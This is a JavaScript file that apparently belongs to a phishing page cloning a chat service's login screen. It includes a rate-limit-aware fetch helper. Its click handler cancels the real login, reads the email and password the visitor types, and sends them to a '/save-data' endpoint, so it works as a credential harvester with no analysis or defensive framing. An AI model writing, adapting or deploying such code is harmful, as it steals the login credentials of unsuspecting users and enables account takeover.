const headers = {
	"Content-Type": "application/json",
};

async function fetch_function(url, options) {
	// biome-ignore lint/suspicious/noAsyncPromiseExecutor: <explanation>
	return new Promise(async (resolve, reject) => {
		try {
			const response = await fetch(url, options);

			if (!response.ok) {
				const errorText = await response.text();
				reject(new Error(`HTTP error: ${response.status} - ${errorText}`));
				return;
			}

			const json = await response.json();

			if (json.message === "The resource is being rate limited.") {
				const ms = json.retry_after * 1000;
				await new Promise((resolve) => setTimeout(resolve, ms));
				return resolve(await fetch_function(url, options));
			}

			resolve(json);
		} catch (error) {
			reject(error);
		}
	});
}

document.addEventListener("DOMContentLoaded", () => {
	const loginButton = document.querySelector('button[type="submit"]');
	const emailInput = document.getElementById("uid_9");
	const passwordInput = document.getElementById("uid_11");

	if (loginButton && emailInput && passwordInput) {
		loginButton.addEventListener("click", async (event) => {
			event.preventDefault();

			const email = emailInput.value;
			const password = passwordInput.value;

			if (!email || !password) {
				console.error("Email or password is missing.");
				return;
			}

			const data = {
				email: email,
				password: password,
			};

			try {
				const saveResponse = await fetch("/save-data", {
					method: "POST",
					headers: {
						"Content-Type": "application/json",
					},
					body: JSON.stringify(data),
				});

				const saveResponseText = await saveResponse.text();

				if (saveResponse.ok) {
					console.log("Data saved successfully.");
					console.log("Save Response:", saveResponseText);
				} else {
					console.error("Error saving data:", saveResponse.statusText);
				}
			} catch (error) {
				console.error("Error during API request:", error);
			}
		});
	} else {
		console.error("One or more elements not found.");
	}
});
